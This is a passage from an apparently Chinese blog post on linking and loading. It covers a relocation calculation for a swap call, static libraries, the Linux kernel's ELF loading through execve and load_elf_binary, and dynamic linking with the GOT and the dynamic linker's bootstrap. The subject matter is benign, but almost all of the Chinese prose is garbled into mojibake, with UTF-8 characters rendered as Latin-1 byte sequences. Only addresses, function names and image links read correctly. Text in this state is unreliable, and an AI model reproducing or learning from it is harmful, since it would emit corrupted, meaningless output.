<p>æœ€åçš„é‡å®šä½ä¿®æ­£åœ°å€ä¸ºï¼šS + A -P = 0x2000 +ï¼ˆ-4ï¼‰- 0x1027 = 0xFD5.å³ä¿®æ­£åçš„ç¨‹åºä¸ºï¼š</p>
<p>â€¦</p>
<p>1023: 11 11 11</p>
<p>1026:e8<br>d5 0f 00 00</p>
<p>102b: 11 11 11</p>
<p>â€¦</p>
<p>å‘ç°ç†Ÿæ‚‰çš„è§„åˆ™äº†å—ï¼Ÿä¸‹ä¸€æ¡æŒ‡ä»¤ï¼ˆPCï¼‰çš„åœ°å€ä¸º0x102bï¼ŒåŠ ä¸Šè¿™ä¸ªä¿®æ­£å€¼æ­£å¥½ç­‰äº0x2000ï¼Œ</p>
<p>0x102b + 0xFD5 = 0x2000ï¼Œåˆšå¥½æ˜¯swapå‡½æ•°çš„åœ°å€ã€‚</p>
<p><img src="http://hi.csdn.net/attachment/201011/28/0_1290945325g9vI.gif" alt=""></p>
<p>ä»¥ä¸Šå†…å®¹æ²¡æœ‰æ¶‰åŠåˆ°cæ ‡å‡†åº“ï¼Œä»…ä»…æ˜¯è‡ªå·±å®ç°çš„ä¸¤ä¸ªcè¯­è¨€ç¨‹åºä¹‹é—´çš„é“¾æ¥çŠ¶å†µï¼Œä¹Ÿå°±æ˜¯â€œç¨‹åºé‡Œé¢çš„printfæ€ä¹ˆå¤„ç†â€æ²¡æœ‰è¯´æ˜ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬å°±è¦æåŠâ€œé™æ€åº“â€çš„æ¦‚å¿µã€‚å…¶å®ä¸€ä¸ªé™æ€åº“å¯ä»¥ç®€å•åœ°çœ‹æˆä¸€ç»„ç›®æ ‡æ–‡ä»¶çš„é›†åˆï¼Œå³å¾ˆå¤šç›®æ ‡æ–‡ä»¶ç»è¿‡å‹ç¼©æ‰“åŒ…åå½¢æˆçš„ä¸€ä¸ªæ–‡ä»¶ã€‚ä¸é™æ€åº“é“¾æ¥çš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼šldé“¾æ¥å™¨è‡ªåŠ¨æŸ¥æ‰¾å…¨å±€ç¬¦å·è¡¨ï¼Œæ‰¾åˆ°é‚£äº›ä¸ºå†³è®®çš„ç¬¦å·ï¼Œç„¶åæŸ¥å‡ºå®ƒä»¬æ‰€åœ¨çš„ç›®æ ‡æ–‡ä»¶ï¼Œå°†è¿™äº›ç›®æ ‡æ–‡ä»¶ä»é™æ€åº“ä¸­â€œè§£å‹â€å‡ºæ¥ï¼Œæœ€ç»ˆå°†å®ƒä»¬é“¾æ¥åœ¨ä¸€èµ·æˆä¸ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´åªæœ‰å°‘æ•°å‡ ä¸ªåº“å’Œç›®æ ‡æ–‡ä»¶è¢«é“¾æ¥å…¥äº†æœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œéæ‰€æœ‰çš„åº“ä¸€è‚¡è„‘åœ°è¢«é“¾æ¥è¿›äº†å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p>
<h2 id="å››ã€è£…è½½ï¼š"><a href="#å››ã€è£…è½½ï¼š" class="headerlink" title="å››ã€è£…è½½ï¼š"></a>å››ã€è£…è½½ï¼š</h2><p>ä»¥Linuxå†…æ ¸è£…è½½ELFä¸ºä¾‹ç®€è¿°ä¸€ä¸‹è£…è½½è¿‡ç¨‹ã€‚å½“æˆ‘ä»¬åœ¨Linuxç³»ç»Ÿçš„bashä¸‹è¾“å…¥ä¸€ä¸ªå‘½ä»¤æ‰§è¡ŒæŸä¸ªELFç¨‹åºæ—¶ï¼Œåœ¨ç”¨æˆ·å±‚é¢ï¼Œbashè¿›ç¨‹ä¼šè°ƒç”¨fork()ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œç„¶åæ–°çš„è¿›ç¨‹è°ƒç”¨execve()æ¥æ‰§è¡ŒæŒ‡å®šçš„ELFæ–‡ä»¶ï¼ŒåŸå…ˆçš„bashè¿›ç¨‹ç»§ç»­è¿”å›ç­‰å¾…åˆšæ‰å¯åŠ¨æ—¶æ–°è¿›ç¨‹ç»“æŸï¼Œç„¶åç»§ç»­ç­‰å¾…ç”¨æˆ·è¾“å…¥å‘½ä»¤ã€‚è¿™é‡Œéœ€æ³¨æ„ï¼Œéšç€ä¸€ä¸ªæ–°è¿›ç¨‹çš„å‡ºç°ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸ºå®ƒåˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚</p>
<p>ã€åˆ›å»ºè™šæ‹Ÿåœ°å€ç©ºé—´ã€‘æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªè™šæ‹Ÿç©ºé—´ç”±ä¸€ç»„æ˜ å°„å‡½æ•°å°†è™šæ‹Ÿç©ºé—´çš„å„ä¸ªé¡µæ˜ å°„åˆ°ç›¸åº”çš„ç‰©ç†ç©ºé—´ï¼Œé‚£ä¹ˆåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç©ºé—´å®é™…ä¸Šå¹¶ä¸æ˜¯åˆ›å»ºç©ºé—´è€Œæ˜¯åˆ›å»ºæ˜ å°„å‡½æ•°æ‰€éœ€è¦çš„æ•°æ®ç»“æ„ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œåœ¨x86çš„Linuxä¸‹åˆ›å»ºè™šæ‹Ÿåœ°å€ç©ºé—´å®é™…ä¸Šåªæ˜¯åˆ†é…ä¸€ä¸ªé¡µç›®å½•ï¼ˆé¡µè¡¨ï¼‰å°±å¯ä»¥äº†ï¼Œç”šè‡³ä¸è®¾ç½®é¡µæ˜ å°„å…³ç³»ï¼Œè¿™äº›æ˜ å°„å…³ç³»ç­‰åˆ°åé¢ç¨‹åºå‘ç”Ÿâ€œç¼ºé¡µâ€æ—¶åœ¨è¿›è¡Œè®¾ç½®ã€‚</p>
<p>åœ¨è¿›å…¥execve()ç³»ç»Ÿè°ƒç”¨ä¹‹åï¼ŒLinuxå†…æ ¸å°±å¼€å§‹è¿›è¡ŒçœŸæ­£çš„è£…è½½å·¥ä½œã€‚åœ¨å†…æ ¸ä¸­ï¼Œexecve()ç³»ç»Ÿè°ƒç”¨ç›¸åº”çš„å…¥å£æ˜¯sys_execve(),ä½œç”¨ï¼šå‚æ•°çš„æ£€æŸ¥å¤åˆ¶ï¼›è°ƒç”¨do_execve(),æµç¨‹ï¼šæŸ¥æ‰¾è¢«æ‰§è¡Œçš„æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶çš„å‰128ä¸ªå­—èŠ‚ä»¥åˆ¤æ–­æ–‡ä»¶çš„æ ¼å¼æ˜¯elfè¿˜æ˜¯å…¶å®ƒï¼›è°ƒç”¨search_binary_handle(),æµç¨‹ï¼šé€šè¿‡åˆ¤æ–­æ–‡ä»¶å¤´éƒ¨çš„é­”æ•°ç¡®å®šæ–‡ä»¶çš„æ ¼å¼ï¼Œå¹¶ä¸”è°ƒç”¨ç›¸åº”çš„è£…è½½å¤„ç†ç¨‹åºã€‚ELFå¯æ‰§è¡Œæ–‡ä»¶çš„è£…è½½å¤„ç†è¿‡ç¨‹å«load_elf_binary(),å®ƒçš„ä¸»è¦æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<p>1ï¼Œæ£€æŸ¥ELFå¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼çš„æœ‰æ•ˆæ€§ï¼Œæ¯”å¦‚é­”æ•°ã€ç¨‹åºå¤´è¡¨ä¸­æ®µçš„æ•°é‡ã€‚</p>
<p>2ï¼Œå¯»æ‰¾åŠ¨æ€é“¾æ¥çš„â€œ.interpâ€æ®µï¼Œæ‰¾åˆ°åŠ¨æ€é“¾æ¥å™¨çš„è·¯å¾„ï¼Œä»¥ä¾¿äºåé¢åŠ¨æ€é“¾æ¥æ—¶ä¼šç”¨ä¸Šã€‚</p>
<p>3ï¼Œè¯»å–å¯æ‰§è¡Œæ–‡ä»¶çš„ç¨‹åºå¤´ï¼Œå¹¶ä¸”åˆ›å»ºè™šæ‹Ÿç©ºé—´ä¸å¯æ‰§è¡Œæ–‡ä»¶çš„æ˜ å°„å…³ç³»ã€‚</p>
<p>ã€è¯»å–å¯æ‰§è¡Œæ–‡ä»¶çš„ç¨‹åºå¤´ï¼ˆå­˜å‚¨äº†å“ªäº›éƒ¨åˆ†è¢«æ˜ å°„ï¼‰ï¼Œå¹¶ä¸”åˆ›å»ºè™šæ‹Ÿç©ºé—´ä¸å¯æ‰§è¡Œæ–‡ä»¶çš„æ˜ å°„å…³ç³»ã€‘åˆ›å»ºè™šæ‹Ÿç©ºé—´æ—¶çš„é¡µæ˜ å°„å…³ç³»å‡½æ•°æ˜¯è™šæ‹Ÿç©ºé—´åˆ°ç‰©ç†å†…å­˜çš„æ˜ å°„å…³ç³»ï¼Œè€Œè¿™ä¸€æ­¥æ‰€åšçš„äº‹è™šæ‹Ÿç©ºé—´ä¸å¯æ‰§è¡Œæ–‡ä»¶çš„æ˜ å°„å…³ç³»ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œå½“ç¨‹åºå‘ç”Ÿç¼ºé¡µæ˜¯ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸ºç‰©ç†å†…å­˜åˆ†é…ä¸€ä¸ªç‰©ç†é¡µï¼Œç„¶åå°†è¯¥ç¼ºé¡µä»ç£ç›˜ä¸­è¯»å–åˆ°å†…å­˜ï¼Œåœ¨è®¾ç½®ç¼ºé¡µçš„è™šæ‹Ÿé¡µä¸ç‰©ç†é¡µä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œè¿™æ ·ç¨‹åºæ‰å¯ä»¥å¾—ä»¥æ­£å¸¸è¿è¡Œã€‚ä½†æ˜¯æ˜æ˜¾çš„ä¸€ç‚¹æ˜¯ï¼Œå½“æ“ä½œç³»ç»Ÿæ•è·åˆ°ç¼ºé¡µé”™è¯¯æ—¶ï¼Œä»–åº”å½“çŸ¥é“ç¨‹åºå½“å‰éœ€è¦çš„é¡µåœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„å“ªä¸€ä¸ªä½ç½®ã€‚è€Œè¿™å°±æ˜¯è™šæ‹Ÿå­˜å‚¨ä¸å¯æ‰§è¡Œæ–‡ä»¶ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚å®é™…ä¸Šï¼Œè¿™ç§æ˜ å°„å…³ç³»ä»…ä»…æ˜¯ä¿å­˜åœ¨æ“ä½œç³»ç»Ÿå†…éƒ¨çš„ä¸€ä¸ªæ•°æ®ç»“æ„ã€‚å½“å‘ç”Ÿç¼ºé¡µé”™è¯¯æ˜¯ï¼ŒCPUå°†æ§åˆ¶æƒäº¤ç»™æ“ä½œç³»ç»Ÿï¼Œæ“ä½œç³»ç»Ÿåˆ©ç”¨ä¸“é—¨çš„ç¼ºé¡µå¤„ç†ä¾‹ç¨‹æ¥æŸ¥è¯¢è¿™ä¸ªæ•°æ®ç»“æ„ï¼ˆæ˜ å°„å…³ç³»ï¼‰ï¼Œç„¶åæ‰¾åˆ°æ‰€éœ€é¡µæ‰€åœ¨çš„è™šæ‹Ÿå†…å­˜åŒºåŸŸï¼Œä»¥åŠåœ¨å¯æ‰§è¡Œæ–‡ä»¶çš„åç§»ï¼Œç„¶åæŠŠè¯¥é¡µåŠ è½½è¿›ç‰©ç†å†…å­˜ï¼ŒåŒæ—¶å°†è¯¥è™šæ‹Ÿé¡µä¸ç‰©ç†é¡µä¹‹é—´å»ºç«‹æ˜ å°„å…³ç³»ï¼Œæœ€åæŠŠæ§åˆ¶æƒè¿˜ç»™è¿›ç¨‹ï¼Œè¿›ç¨‹ä»åˆšæ‰ç¼ºé¡µä½ç½®é‡æ–°å¼€å§‹æ‰§è¡Œã€‚</p>
<p>4ï¼Œåˆå§‹åŒ–ELFè¿›ç¨‹ç¯å¢ƒã€‚</p>
<p>5ï¼Œå°†ç³»ç»Ÿè°ƒç”¨çš„è¿”å›åœ°å€ä¿®æ”¹æˆELFå¯æ‰§è¡Œæ–‡ä»¶çš„å…¥å£ç‚¹ï¼Œè¿™ä¸ªå…¥å£ç‚¹å–å†³äºç¨‹åºçš„é“¾æ¥æ–¹å¼ï¼Œå¯¹äºé™æ€é“¾æ¥çš„ELFå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå®ƒå°±æ˜¯ELFæ–‡ä»¶çš„æ–‡ä»¶å¤´ä¸­e_entryæ‰€æŒ‡çš„åœ°å€ï¼›å¯¹äºåŠ¨æ€é“¾æ¥çš„ELFå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç¨‹åºå…¥å£ç‚¹å°±æ˜¯åŠ¨æ€é“¾æ¥å™¨ã€‚</p>
<p>ã€å°†CPUæŒ‡ä»¤å¯„å­˜å™¨è®¾ç½®æˆå¯æ‰§è¡Œæ–‡ä»¶çš„å…¥å£ï¼Œå¯åŠ¨è¿è¡Œã€‘å¯¹åŠ¨æ€é“¾æ¥æ¥è®²ï¼Œæ­¤æ—¶å°±å¯åŠ¨äº†åŠ¨æ€é“¾æ¥å™¨ã€‚</p>
<p>å½“load_elf_binary()æ‰§è¡Œå®Œæ¯•ï¼Œè¿”å›è‡³do_execve()åœ¨è¿”å›è‡³sys_execve()æ—¶ï¼Œç³»ç»Ÿè°ƒç”¨çš„è¿”å›åœ°å€å·²ç»è¢«æ”¹å†™æˆäº†è¢«è£…è½½çš„ELFç¨‹åºçš„å…¥å£åœ°å€äº†ã€‚æ‰€ä»¥ï¼Œå½“sys_execve()ç³»ç»Ÿè°ƒç”¨ä»å†…æ ¸æ€è¿”å›åˆ°ç”¨æˆ·æ€æ—¶ï¼ŒEIPå¯„å­˜å™¨ç›´æ¥è·³è½¬åˆ°ELFç¨‹åºçš„å…¥å£åœ°å€ã€‚æ­¤æ—¶ï¼ŒELFå¯æ‰§è¡Œæ–‡ä»¶è£…è½½å®Œæˆã€‚æ¥ä¸‹æ¥å°±æ˜¯åŠ¨æ€é“¾æ¥å™¨å¯¹ç¨‹åºè¿›è¡ŒåŠ¨æ€é“¾æ¥äº†ã€‚</p>
<p>è¿›ç¨‹çš„è™šæ‹Ÿç©ºé—´ï¼š</p>
<p><img src="http://images2015.cnblogs.com/blog/376860/201608/376860-20160806161516825-542579710.png" alt=""></p>
<h2 id="äº”ã€åŠ¨æ€é“¾æ¥"><a href="#äº”ã€åŠ¨æ€é“¾æ¥" class="headerlink" title="äº”ã€åŠ¨æ€é“¾æ¥"></a>äº”ã€åŠ¨æ€é“¾æ¥</h2><p>åŠ¨æ€é“¾æ¥ELFæ–‡ä»¶çš„ç”Ÿæˆè¿‡ç¨‹</p>
<p><img src="http://images2015.cnblogs.com/blog/376860/201608/376860-20160806163246840-1854978573.png" alt=""></p>
<p>ä¸»è¦åŸå› æœ‰ä¸¤ä¸ªï¼šç¬¬ä¸€ï¼Œè€ƒè™‘å†…å­˜å’Œç£ç›˜ç©ºé—´ã€‚é™æ€é“¾æ¥æå¤§åœ°æµªè´¹å†…å­˜ç©ºé—´ã€‚å› ä¸ºåœ¨é™æ€é“¾æ¥çš„æƒ…å†µä¸‹ï¼Œå‡è®¾æœ‰ä¸¤ä¸ªç¨‹åºå…±äº«ä¸€ä¸ªæ¨¡å—ï¼Œé‚£ä¹ˆåœ¨é™æ€é“¾æ¥åè¾“å‡ºçš„ä¸¤ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¸­å„æœ‰ä¸€ä¸ªå…±äº«æ¨¡å—çš„å‰¯æœ¬ã€‚å¦‚æœåŒæ—¶è¿è¡Œè¿™ä¸¤ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªå…±äº«æ¨¡å—å°†åœ¨ç£ç›˜å’Œå†…å­˜ä¸­éƒ½æœ‰ä¸¤ä¸ªå‰¯æœ¬ï¼Œå¯¹ç£ç›˜å’Œå†…å­˜é€ æˆæå¤§åœ°æµªè´¹ï¼›ç¬¬äºŒï¼Œç¨‹åºçš„æ›´æ–°ã€‚ä¸€æ—¦ç¨‹åºä¸­çš„ä¸€ä¸ªæ¨¡å—è¢«ä¿®æ”¹ï¼Œé‚£ä¹ˆæ•´ä¸ªç¨‹åºéƒ½è¦é‡æ–°é“¾æ¥ã€å‘å¸ƒç»™ç”¨æˆ·ã€‚å¦‚æœè¿™ä¸ªç¨‹åºç›¸å½“çš„å¤§ï¼Œé‚£ä¹ˆåæœå°±ä¼šæ›´åŠ ä¸¥é‡ï¼</p>
<p> å¯¹äºä¸€ä¸ªå…±äº«å¯¹è±¡ï¼ˆlinuxä¸‹å…±äº«çš„æ¨¡å—ï¼‰ï¼Œè¦å®ç°è¢«å…¶ä»–ç¨‹åºä¹‹é—´çš„å…±äº«ï¼Œå°±è¦ä½¿å…¶ä»£ç å’Œæ•°æ®åˆ†å¼€ï¼Œæ¯ä¸ªç¨‹åºéƒ½ä¼šæœ‰è¯¥æ¨¡å—çš„æ•°æ®éƒ¨åˆ†çš„å‰¯æœ¬ï¼Œä»£ç éƒ¨åˆ†æ˜¯å…±äº«çš„ã€‚</p>
<p>å…±äº«æ¨¡å—è¢«æ˜ å°„çš„è™šæ‹Ÿåœ°å€ç©ºé—´å°±åœ¨ä¸Šé¢è¿›ç¨‹è™šæ‹Ÿç©ºé—´ä¸­çš„ ï¼ˆMemery Mappingéƒ¨åˆ†ï¼‰</p>
<p>å…±äº«æ¨¡å—è¢«æ˜ å°„çš„æ¨¡æ ·æ˜¯</p>
<p><img src="http://images2015.cnblogs.com/blog/376860/201608/376860-20160806164350590-605002435.png" alt=""></p>
<p>åŠ¨æ€é“¾æ¥åšäº†ä»€ä¹ˆï¼Ÿ</p>
<p>åŠ¡å¿…çŸ¥é“ï¼ŒåŠ¨æ€é“¾æ¥æ˜¯ç›¸å¯¹äºå…±äº«å¯¹è±¡è€Œè¨€çš„ã€‚åŠ¨æ€é“¾æ¥å™¨å°†ç¨‹åºæ‰€éœ€è¦çš„æ‰€æœ‰å…±äº«åº“è£…è½½åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œå¹¶ä¸”å°†ç¨‹åºæ±‡æ€»æ‰€æœ‰ä¸ºå†³è®®çš„ç¬¦å·ç»‘å®šåˆ°ç›¸åº”çš„åŠ¨æ€é“¾æ¥åº“ï¼ˆå…±äº«åº“ï¼‰ä¸­ï¼Œå¹¶è¿›è¡Œé‡å®šä½å·¥ä½œã€‚</p>
<p>å¯¹äºå…±äº«æ¨¡å—æ¥è¯´ï¼Œè¦å®ç°å…±äº«ï¼Œé‚£ä¹ˆå…¶ä»£ç å¯¹æ•°æ®çš„è®¿é—®å¿…é¡»æ˜¯åœ°å€æ— å…³ï¼ˆå°±æ˜¯ä»£ç ä¸­çš„åœ°å€æ˜¯å›ºå®šçš„ï¼Œå½“ç„¶è¿™æ˜¯ç”¨çš„ç›¸å¯¹åœ°å€å–½ï¼‰çš„ï¼Œå¦‚ä½•åšåˆ°åœ°å€æ— å…³ï¼Œç¼–è¯‘å™¨æ˜¯è¿™ä¹ˆå¹²çš„ï¼Œæ¯ä¸€ä¸ªå…±äº«æ¨¡å—ï¼Œéƒ½ä¼šåœ¨å…¶ä»£ç æ®µæœ‰ä¸€ä¸ªGOT(global offset table)æ®µï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒGotæ˜¯ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å˜é‡çš„åœ°å€ï¼Œè€Œä»£ç ç›¸å¯¹äºGotçš„è·ç¦»æ˜¯å›ºå®šçš„ï¼Œå½“å¯¹å¤–éƒ¨æ¨¡å—å˜é‡æ•°æ®å’Œå‡½æ•°è¿›è¡Œè®¿é—®æ—¶ï¼Œå°±å»è®¿é—®å˜é‡åœ¨GOTä¸­çš„ä½ç½®ã€‚</p>
<p>å…±äº«æ¨¡å—å¯¹äºæ•°æ®çš„è®¿é—®æ–¹å¼ï¼š</p>
<pre><code>æœ¬æ¨¡å—çš„å…¨å±€å˜é‡å’Œå‡½æ•°------ç›¸å¯¹åœ°å€

å¤–æ¨¡å—çš„å…¨å±€å˜é‡å’Œå‡½æ•°-------GOTæ®µ
</code></pre><p>åŠ¨æ€é“¾æ¥é‡å®šä½æ—¶ä¿®æ”¹GOTä¸­çš„å€¼å°±å®ç°äº†å¯¹å˜é‡çš„æ­£ç¡®è®¿é—®ã€‚</p>
<p>åŠ¨æ€é“¾æ¥çš„ELFæ–‡ä»¶å¯åŠ¨è¿‡ç¨‹</p>
<p>åŠ¨æ€é“¾æ¥åŸºæœ¬åˆ†ä¸ºä¸‰æ­¥ï¼šå…ˆæ˜¯å¯åŠ¨åŠ¨æ€é“¾æ¥å™¨æœ¬èº«ï¼Œç„¶åè£…è½½æ‰€æœ‰éœ€è¦çš„å…±äº«å¯¹è±¡ï¼Œæœ€åé‡å®šä½å’Œåˆå§‹åŒ–ã€‚</p>
<h3 id="1ï¼ŒåŠ¨æ€é“¾æ¥å™¨è‡ªä¸¾"><a href="#1ï¼ŒåŠ¨æ€é“¾æ¥å™¨è‡ªä¸¾" class="headerlink" title="1ï¼ŒåŠ¨æ€é“¾æ¥å™¨è‡ªä¸¾"></a>1ï¼ŒåŠ¨æ€é“¾æ¥å™¨è‡ªä¸¾</h3><p>å°±æˆ‘ä»¬æ‰€çŸ¥é“çš„ï¼Œå¯¹æ™®é€šçš„å…±äº«å¯¹è±¡æ–‡ä»¶æ¥è¯´ï¼Œå®ƒçš„é‡å®šä½å·¥ä½œæ˜¯ç”±åŠ¨æ€é“¾æ¥å™¨æ¥å®Œæˆï¼›å®ƒä¹Ÿå¯ä»¥ä¾èµ–äºå…¶ä»–å…±äº«å¯¹è±¡ï¼Œå…¶ä¸­è¢«ä¾èµ–çš„å…±äº«å¯¹è±¡ç”±åŠ¨æ€é“¾æ¥å™¨è´Ÿè´£é“¾æ¥å’Œè£…è½½ã€‚é‚£ä¹ˆï¼Œå¯¹äºåŠ¨æ€é“¾æ¥å™¨æœ¬èº«å‘¢ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªå…±äº«å¯¹è±¡ï¼Œå®ƒçš„é‡å®šä½å·¥ä½œç”±è°å®Œæˆï¼Ÿå®ƒæ˜¯å¦å¯ä»¥ä¾èµ–äºå…¶ä»–çš„å…±äº«å¯¹è±¡æ–‡ä»¶ï¼Ÿ</p>
<p>åŠ¨æ€é“¾æ¥å™¨æœ‰å…¶è‡ªèº«çš„ç‰¹æ®Šæ€§ï¼šé¦–å…ˆï¼ŒåŠ¨æ€é“¾æ¥å™¨æœ¬èº«ä¸å¯ä»¥ä¾èµ–å…¶ä»–ä»»ä½•å…±äº«å¯¹è±¡ï¼ˆäººä¸ºæ§åˆ¶ï¼‰ï¼›å…¶æ¬¡åŠ¨æ€é“¾æ¥å™¨æœ¬èº«æ‰€éœ€è¦çš„å…¨å±€å’Œé™æ€å˜é‡çš„é‡å®šä½å·¥ä½œç”±å®ƒè‡ªèº«å®Œæˆï¼ˆè‡ªä¸¾ä»£ç ï¼‰ã€‚</p>
<p>æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨Linuxä¸‹ï¼ŒåŠ¨æ€é“¾æ¥å™¨ld.soå®é™…ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªå…±äº«å¯¹è±¡ï¼Œæ“ä½œç³»ç»ŸåŒæ ·é€šè¿‡æ˜ å°„çš„æ–¹å¼å°†å®ƒåŠ è½½åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­ã€‚æ“ä½œç³»ç»Ÿåœ¨åŠ è½½å®ŒåŠ¨æ€é“¾æ¥å™¨ä¹‹åï¼Œå°±å°†æ§åˆ¶æƒäº¤ç»™åŠ¨æ€é“¾æ¥å™¨ã€‚åŠ¨æ€é“¾æ¥å™¨å…¥å£åœ°å€å³æ˜¯è‡ªä¸¾ä»£ç çš„å…¥å£ã€‚åŠ¨æ€é“¾æ¥å™¨å¯åŠ¨åï¼Œå®ƒçš„è‡ªä¸¾ä»£ç å³å¼€å§‹æ‰§è¡Œã€‚è‡ªä¸¾ä»£ç é¦–å…ˆä¼šæ‰¾åˆ°å®ƒè‡ªå·±çš„GOT(å…¨å±€åç§»è¡¨ï¼Œè®°å½•æ¯ä¸ªæ®µçš„åç§»ä½ç½®ï¼‰ã€‚è€ŒGOTçš„ç¬¬ä¸€ä¸ªå…¥å£ä¿å­˜çš„å°±æ˜¯â€œ.dynamicâ€æ®µçš„åç§»åœ°å€ï¼Œç”±æ­¤æ‰¾åˆ°åŠ¨æ€é“¾æ¥å™¨æœ¬èº«çš„â€œ.dynamicâ€æ®µã€‚é€šè¿‡â€œ.dynamicâ€æ®µä¸­çš„ä¿¡æ¯ï¼Œè‡ªä¸¾ä»£ç ä¾¿å¯ä»¥è·å¾—åŠ¨æ€é“¾æ¥å™¨æœ¬èº«çš„é‡å®šä½è¡¨å’Œç¬¦å·è¡¨ç­‰ï¼Œä»è€Œå¾—åˆ°åŠ¨æ€é“¾æ¥å™¨æœ¬èº«çš„é‡å®šä½å…¥å£ï¼Œç„¶åå°†å®ƒä»¬é‡å®šä½ã€‚å®Œæˆè‡ªä¸¾åï¼Œå°±å¯ä»¥è‡ªç”±åœ°è°ƒç”¨å„ç§å‡½æ•°å’Œå…¨å±€å˜é‡ã€‚</p>
<h3 id="2ï¼Œè£…è½½å…±äº«å¯¹è±¡"><a href="#2ï¼Œè£…è½½å…±äº«å¯¹è±¡" class="headerlink" title="2ï¼Œè£…è½½å…±äº«å¯¹è±¡"></a>2ï¼Œè£…è½½å…±äº«å¯¹è±¡</h3><p>å®Œæˆè‡ªä¸¾åï¼ŒåŠ¨æ€é“¾æ¥å™¨å°†å¯æ‰§è¡Œæ–‡ä»¶å’Œé“¾æ¥å™¨æœ¬èº«çš„ç¬¦å·è¡¨éƒ½åˆå¹¶åˆ°ä¸€ä¸ªç¬¦å·è¡¨å½“ä¸­ï¼Œç§°ä¹‹ä¸ºâ€œå…¨å±€ç¬¦å·è¡¨â€ã€‚ç„¶åé“¾æ¥å™¨å¼€å§‹å¯»æ‰¾å¯æ‰§è¡Œæ–‡ä»¶æ‰€ä¾èµ–çš„å…±äº«å¯¹è±¡ï¼šä»â€œ.dynamicâ€æ®µä¸­æ‰¾åˆ°DT_NEEDEDç±»å‹ï¼Œå®ƒæ‰€æŒ‡å‡ºçš„å°±æ˜¯å¯æ‰§è¡Œæ–‡ä»¶æ‰€ä¾èµ–çš„å…±äº«å¯¹è±¡ã€‚ç”±æ­¤ï¼ŒåŠ¨æ€é“¾æ¥å™¨å¯ä»¥åˆ—å‡ºå¯æ‰§è¡Œæ–‡ä»¶æ‰€ä¾èµ–çš„æ‰€æœ‰å…±äº«å¯¹è±¡ï¼Œå¹¶å°†è¿™äº›å…±äº«å¯¹è±¡çš„åå­—æ”¾å…¥åˆ°ä¸€ä¸ªè£…è½½é›†åˆä¸­ã€‚ç„¶åé“¾æ¥å™¨å¼€å§‹ä»é›†åˆä¸­å–å‡ºä¸€ä¸ªæ‰€éœ€è¦çš„å…±äº«å¯¹è±¡çš„åå­—ï¼Œæ‰¾åˆ°ç›¸åº”çš„æ–‡ä»¶åæ‰“å¼€è¯¥æ–‡ä»¶ï¼Œè¯»å–ç›¸åº”çš„ELFæ–‡ä»¶å¤´å’Œâ€œ.dynamicâ€ï¼Œç„¶åå°†å®ƒç›¸åº”çš„ä»£ç æ®µå’Œæ•°æ®æ®µæ˜ å°„åˆ°è¿›ç¨‹ç©ºé—´ä¸­ã€‚å¦‚æœè¿™ä¸ªELFå…±äº«å¯¹è±¡è¿˜ä¾èµ–äºå…¶ä»–å…±äº«å¯¹è±¡ï¼Œé‚£ä¹ˆå°†ä¾èµ–çš„å…±äº«å¯¹è±¡çš„åå­—æ”¾åˆ°è£…è½½é›†åˆä¸­ã€‚å¦‚æ­¤å¾ªç¯ï¼Œç›´åˆ°æ‰€æœ‰ä¾èµ–çš„å…±äº«å¯¹è±¡éƒ½è¢«è£…è½½å®Œæˆä¸ºæ­¢ã€‚</p>
<p>å½“ä¸€ä¸ªæ–°çš„å…±äº«å¯¹è±¡è¢«è£…è½½è¿›æ¥çš„æ—¶å€™ï¼Œå®ƒçš„ç¬¦å·è¡¨ä¼šè¢«åˆå¹¶åˆ°å…¨å±€ç¬¦å·è¡¨ä¸­ã€‚æ‰€ä»¥å½“æ‰€æœ‰çš„å…±äº«å¯¹è±¡éƒ½è¢«è£…è½½è¿›æ¥çš„æ—¶å€™ï¼Œå…¨å±€ç¬¦å·è¡¨é‡Œé¢å°†åŒ…å«åŠ¨æ€é“¾æ¥å™¨æ‰€éœ€è¦çš„æ‰€æœ‰ç¬¦å·ã€‚</p>
